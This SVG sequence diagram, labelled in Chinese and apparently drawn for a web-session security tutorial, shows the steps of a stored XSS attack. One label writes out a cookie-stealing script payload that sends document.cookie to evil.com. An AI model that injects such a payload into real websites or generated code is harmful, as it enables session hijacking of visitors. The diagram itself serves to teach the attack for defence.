<svg xmlns="http://www.w3.org/2000/svg" width="1600" height="660" viewBox="0 0 1600 660">
  <defs>
    <linearGradient id="bg" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0" stop-color="#06111d"/>
      <stop offset="1" stop-color="#111b16"/>
    </linearGradient>
    <pattern id="grid" width="56" height="56" patternUnits="userSpaceOnUse">
      <path d="M56 0H0V56" fill="none" stroke="#89ddff" stroke-opacity="0.06"/>
    </pattern>
    <marker id="arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
      <path d="M0 0L10 5L0 10z" fill="#67e7ff"/>
    </marker>
    <marker id="arrowGray" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
      <path d="M0 0L10 5L0 10z" fill="#9fb8c8"/>
    </marker>
    <marker id="arrowRed" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
      <path d="M0 0L10 5L0 10z" fill="#ff9ab1"/>
    </marker>
  </defs>
  <rect width="1600" height="660" fill="url(#bg)"/>
  <rect width="1600" height="660" fill="url(#grid)"/>

  <text x="80" y="78" fill="#f4fbff" font-family="Arial, 'PingFang SC', sans-serif" font-size="40" font-weight="800">存储型 XSS 攻击流程</text>
  <text x="80" y="118" fill="#9fb8c8" font-family="Arial, 'PingFang SC', sans-serif" font-size="20">恶意脚本存入数据库，所有访问该页面的用户都会中招</text>

  <!-- 参与者 -->
  <rect x="80" y="160" width="220" height="64" rx="12" fill="#1a2733" stroke="#ff9ab1" stroke-opacity="0.6"/>
  <text x="190" y="198" fill="#ff9ab1" font-family="Arial, 'PingFang SC', sans-serif" font-size="17" font-weight="700" text-anchor="middle">攻击者</text>

  <rect x="480" y="160" width="220" height="64" rx="12" fill="#0d201a" stroke="#41efb7" stroke-opacity="0.6"/>
  <text x="590" y="198" fill="#72f0c3" font-family="Arial, 'PingFang SC', sans-serif" font-size="17" font-weight="700" text-anchor="middle">服务器</text>

  <rect x="880" y="160" width="220" height="64" rx="12" fill="#0e2133" stroke="#58d7ff" stroke-opacity="0.6"/>
  <text x="990" y="198" fill="#7be6ff" font-family="Arial, 'PingFang SC', sans-serif" font-size="17" font-weight="700" text-anchor="middle">受害者</text>

  <!-- 生命线 -->
  <line x1="190" y1="224" x2="190" y2="600" stroke="#89ddff" stroke-opacity="0.35" stroke-width="1.5" stroke-dasharray="6 6"/>
  <line x1="590" y1="224" x2="590" y2="600" stroke="#89ddff" stroke-opacity="0.35" stroke-width="1.5" stroke-dasharray="6 6"/>
  <line x1="990" y1="224" x2="990" y2="600" stroke="#89ddff" stroke-opacity="0.35" stroke-width="1.5" stroke-dasharray="6 6"/>

  <!-- Phase 1: 注入 -->
  <rect x="270" y="250" width="140" height="26" rx="8" fill="#1a2733" stroke="#ff9ab1" stroke-opacity="0.5" stroke-dasharray="6 5"/>
  <text x="340" y="268" fill="#ff9ab1" font-family="Arial, 'PingFang SC', sans-serif" font-size="12" text-anchor="middle">注入阶段</text>

  <!-- 1: 攻击者发表恶意评论 -->
  <line x1="190" y1="295" x2="582" y2="295" stroke="#ff9ab1" stroke-width="2" marker-end="url(#arrowRed)"/>
  <text x="386" y="283" fill="#ff9ab1" font-family="Arial, 'PingFang SC', sans-serif" font-size="14" text-anchor="middle">发表评论：</text>
  <text x="386" y="313" fill="#ff9ab1" font-family="ui-monospace, monospace" font-size="12" text-anchor="middle">&lt;script&gt;fetch('evil.com/steal?c='+document.cookie)&lt;/script&gt;</text>

  <!-- 自回环: 存入数据库 -->
  <polyline points="590,335 680,335 680,358 598,358" fill="none" stroke="#67e7ff" stroke-width="2" marker-end="url(#arrow)"/>
  <text x="692" y="350" fill="#cfe4ef" font-family="Arial, 'PingFang SC', sans-serif" font-size="13" text-anchor="start">存入数据库（未转义）</text>

  <!-- Phase 2: 触发 -->
  <rect x="660" y="385" width="140" height="26" rx="8" fill="#1a2733" stroke="#58d7ff" stroke-opacity="0.5" stroke-dasharray="6 5"/>
  <text x="730" y="403" fill="#7be6ff" font-family="Arial, 'PingFang SC', sans-serif" font-size="12" text-anchor="middle">触发阶段</text>

  <!-- 2: 受害者访问页面 -->
  <line x1="990" y1="430" x2="598" y2="430" stroke="#67e7ff" stroke-width="2" marker-end="url(#arrow)"/>
  <text x="790" y="418" fill="#cfe4ef" font-family="Arial, 'PingFang SC', sans-serif" font-size="14" text-anchor="middle">访问评论页面</text>

  <!-- 3: 返回包含恶意脚本的页面 -->
  <line x1="590" y1="460" x2="982" y2="460" stroke="#9fb8c8" stroke-width="2" stroke-dasharray="7 6" marker-end="url(#arrowGray)"/>
  <text x="790" y="448" fill="#9fb8c8" font-family="Arial, 'PingFang SC', sans-serif" font-size="13" text-anchor="middle">返回页面（包含恶意脚本）</text>

  <!-- 自回环: 执行脚本 -->
  <polyline points="990,480 1100,480 1100,506 998,506" fill="none" stroke="#ff9ab1" stroke-width="2" marker-end="url(#arrowRed)"/>
  <text x="1112" y="496" fill="#ff9ab1" font-family="Arial, 'PingFang SC', sans-serif" font-size="13" text-anchor="start">浏览器执行恶意脚本</text>

  <!-- 4: Cookie 被发送给攻击者 -->
  <line x1="990" y1="535" x2="198" y2="535" stroke="#ff9ab1" stroke-width="2" marker-end="url(#arrowRed)"/>
  <text x="590" y="523" fill="#ff9ab1" font-family="Arial, 'PingFang SC', sans-serif" font-size="14" text-anchor="middle">Cookie 被发送到 evil.com</text>

  <!-- 自回环: 冒充身份 -->
  <polyline points="190,555 100,555 100,580 182,580" fill="none" stroke="#ff9ab1" stroke-width="2" marker-end="url(#arrowRed)"/>
  <text x="88" y="570" fill="#ff9ab1" font-family="Arial, 'PingFang SC', sans-serif" font-size="12" text-anchor="end">获取 Cookie → 冒充受害者</text>

  <text x="80" y="635" fill="#9fb8c8" font-family="Arial, 'PingFang SC', sans-serif" font-size="14">《Web 会话与身份认证全景》· 存储型 XSS 攻击——恶意脚本持久化到数据库</text>
</svg>
